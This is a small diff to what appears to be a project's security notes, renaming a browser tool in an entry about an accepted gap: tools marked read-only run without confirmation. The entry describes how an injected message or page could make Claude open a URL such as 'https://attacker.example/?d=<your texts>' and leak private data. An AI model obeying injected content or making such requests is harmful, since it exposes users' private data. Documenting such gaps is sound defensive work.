@@ -23,7 +23,7 @@ Sources: [Willison, the lethal trifecta](https://simonwillison.net/2025/Jun/16/t
   message can't fake the end of its quote.
 - **Gap (accepted by Toni, 2026-10-23):** Claude runs tools marked read-only without asking
   ([review criteria](https://claude.com/docs/connectors/building/review-criteria): "Read-only tools
-  can run without per-call confirmation, and destructive tools always prompt"). `browser_read`
+  can run without per-call confirmation, and destructive tools always prompt"). `browser_look`
   (which opens pages and goes back) is marked read-only, but opening a URL sends data out
   (`https://attacker.example/?d=<your texts>`). So an injected message or page could make Claude
   read private data and leak it with no approval prompt. Opening pages should ask, or be limited.
